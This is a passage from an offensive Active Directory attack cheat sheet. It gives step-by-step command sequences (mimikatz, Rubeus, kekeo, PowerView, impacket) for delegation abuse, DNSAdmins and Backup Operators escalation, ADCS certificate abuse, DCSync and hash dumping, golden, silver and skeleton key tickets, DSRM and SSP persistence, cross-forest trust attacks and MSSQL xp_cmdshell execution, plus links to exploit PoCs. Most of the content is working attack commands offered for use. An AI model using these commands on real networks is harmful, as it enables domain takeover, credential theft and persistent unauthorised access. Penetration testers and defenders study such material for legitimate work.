Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay
<WaitInterval> -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```

**Note:** We can also use Rubeus!

### Constrained Delegation

Using PowerView and Kekeo:

```powershell
#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's SPN>

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

_ALTERNATIVE:_
Using Rubeus:

```powershell
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt
```

Now we can access the service as the impersonated user!

:triangular_flag_on_post: **What if we have delegation rights for only a specific SPN? (e.g TIME):**

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

### Resource Based Constrained Delegation

_WUT IS DIS?: \
TL;DR \
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._

Tools we are going to use:

- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Rubeus](https://github.com/GhostPack/Rubeus)

First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

Exploitation Example:

```powershell
#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account's password using Rubeus
Rubeus.exe hash /password:'p@ssword!'

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

Detailed Articles:

- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

:exclamation: In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

```powershell
#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
```

Detailed Article:
[Rubeus – Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

### DNSAdmins Abuse

_WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._

1. Enumerate the members of the DNSAdmins group:
   - PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
   - AD Module: `Get-ADGroupMember -Identiny DNSAdmins`
2. Once we found a member of this group we need to compromise it (There are many ways).
3. Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:

   ```powershell
   #Using dnscmd:
   dnscmd <NameOfDNSMAchine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

   #Restart the DNS Service:
   sc \\DNSServer stop dns
   sc \\DNSServer start dns
   ```

### Abusing Active Directory-Integraded DNS

- [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
- [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

### Abusing Backup Operators Group

_WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._

1. Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:

   ```powershell
   #Create a .txt file that will contain the shadow copy process script
   Script ->{
   set context persistent nowriters
   set metadata c:\windows\system32\spool\drivers\color\example.cab
   set verbose on
   begin backup
   add volume c: alias mydrive

   create

   expose %mydrive% w:
   end backup
   }

   #Execute diskshadow with our script as parameter
   diskshadow /s script.txt
   ```

2. Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
   simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
   going to use [this](https://github.com/giuliano108/SeBackupPrivilege) amazing repo:

   ```powershell
   #Importing both dlls from the repo using powershell
   Import-Module .\SeBackupPrivilegeCmdLets.dll
   Import-Module .\SeBackupPrivilegeUtils.dll

   #Checking if the SeBackupPrivilege is enabled
   Get-SeBackupPrivilege

   #If it isn't we enable it
   Set-SeBackupPrivilege

   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

   #Dump the SYSTEM hive
   reg save HKLM\SYSTEM c:\temp\system.hive
   ```

3. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
4. Use secretsdump.py from impacket and dump the hashes.
5. Use psexec or another tool of your choice to PTH and get Domain Admin access.

### Abusing Exchange

- [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
- [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange

### Weaponizing Printer Bug

- [Printer Server Bug to Domain Administrator](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)
- [NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

### Abusing ACLs

- [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [aclpwn.py](https://github.com/fox-it/aclpwn.py)
- [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

### Abusing IPv6 with mitm6

- [Compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- [mitm6](https://github.com/fox-it/mitm6)

### SID History Abuse

_WUT IS DIS?: If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._

Exploitation example:

```powershell
#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```

Detailed Articles:

- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
- [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

### Exploiting SharePoint

- [CVE-2019-0604](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) RCE Exploitation \
  [PoC](https://github.com/k8gege/CVE-2019-0604)
- [CVE-2019-1257](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) Code execution through BDC deserialization
- [CVE-2020-0932](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) RCE using typeconverters \
  [PoC](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

### Zerologon

- [Zerologon: Unauthenticated domain controller compromise](https://www.secura.com/whitepapers/zerologon-whitepaper): White paper of the vulnerability.
- [SharpZeroLogon](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon): C# implementation of the Zerologon exploit.
- [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon): PowerShell implementation of the Zerologon exploit.
- [Zer0Dump](https://github.com/bb00/zer0dump): Python implementation of the Zerologon exploit using the impacket library.

### PrintNightmare

- [CVE-2021-34527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527): Vulnerability details.
- [Impacket implementation of PrintNightmare](https://github.com/cube0x0/CVE-2021-1675): Reliable PoC of PrintNightmare using the impacket library.
- [C# Implementation of CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare): Reliable PoC of PrintNightmare written in C#.

### Active Directory Certificate Services

**Check for Vulnerable Certificate Templates with:** [Certify](https://github.com/GhostPack/Certify)

_Note: Certify can be executed with Cobalt Strike's `execute-assembly` command as well_

```powershell
.\Certify.exe find /vulnerable /quiet
```

Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights
allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.

This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA")
and use the captured certificate with Rubeus to forge authentication.

_Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target._

Request the DA's Account Certificate with Certify

```powershell
.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
```

This should return a valid certificate for the associated DA account.

The exported `cert.pem` and `cert.key` files must be consolidated into a single `cert.pem` file, with one gap of whitespace between the `END RSA PRIVATE KEY` and the `BEGIN CERTIFICATE`.

_Example of `cert.pem`:_

```
-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
[...]
[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
[...]
[...]
-----END CERTIFICATE-----
```

#Utilize `openssl` to Convert to PKCS #12 Format

The `openssl` command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Once the `cert.pfx` file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, `certutil.exe`, Cobalt Strike's upload functionality, etc.)

After the `cert.pfx` file has been uploaded to the compromised host, [Rubeus](https://github.com/GhostPack/Rubeus) can be used to request a Kerberos TGT for the DA account which will then be imported into memory.

```powershell
.\Rubeus.exe asktht /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
```

This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.

### No PAC

- [sAMAccountname Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [Weaponisation of CVE-2021-42287/CVE-2021-42278](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html) Exploitation of CVE-2021-42278 and CVE-2021-42287
- [noPAC](https://github.com/cube0x0/noPac) C# tool to exploit CVE-2021-42278 and CVE-2021-42287
- [sam-the-admin](https://github.com/WazeHell/sam-the-admin) Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287
- [noPac](https://github.com/Ridter/noPac) Evolution of "sam-the-admin" tool

## Domain Persistence

### Golden Ticket Attack

```powershell
#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

#On any machine:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
<HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCsync Attack

```powershell
#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
```

**Tip:** \
 /ptt -> inject ticket on current running session \
 /ticket -> save the ticket on the system for later use

### Silver Ticket Attack

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

[SPN List](https://adsecurity.org/?page_id=183)

### Skeleton Key Attack

```powershell
#Exploitation Command runned as DA:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

#Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### DSRM Abuse

_WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_

```powershell
#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>

#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

Then just PTH to get local admin access on DC!

### Custom SSP

_WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_

From powershell:

```powershell
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'
```

Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log

## Cross Forest Attacks

### Trust Tickets

_WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT._

:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!

- Using Mimikatz:

  ```powershell
  #Dump the trust key
  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  #Forge an inter-realm TGT using the Golden Ticket attack
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
  <OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
  <PathToSaveTheGoldenTicket>"'
  ```

  :exclamation: Tickets -> .kirbi format

  Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!

- Using Rubeus:

  ```powershell
  .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
  ```

### Abuse MSSQL Servers

- Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
- Check Accessibility as current user:

  ```powershell
  Get-SQLConnectionTestThreaded
  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
  ```

- Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
- Abusing SQL Database Links: \
  _WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!_

Check for existing Database Links:

```powershell
#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instance <SPN> -Verbose

#MSSQL Query:
select * from master..sysservers
```

Then we can use queries to enumerate other links from the linked Database:

```powershell
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')

#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose

# Enable RPC Out (Required to Execute XP_CMDSHELL)
EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');

#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

Query execution:

```powershell
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Breaking Forest Trusts

_WUT IS DIS?: \
TL;DR \
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest._

Tools we are going to use:

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

Exploitation example:

```powershell
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all
```

Detailed Articles:

- [Not A Security Boundary: Breaking Forest Trusts](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)


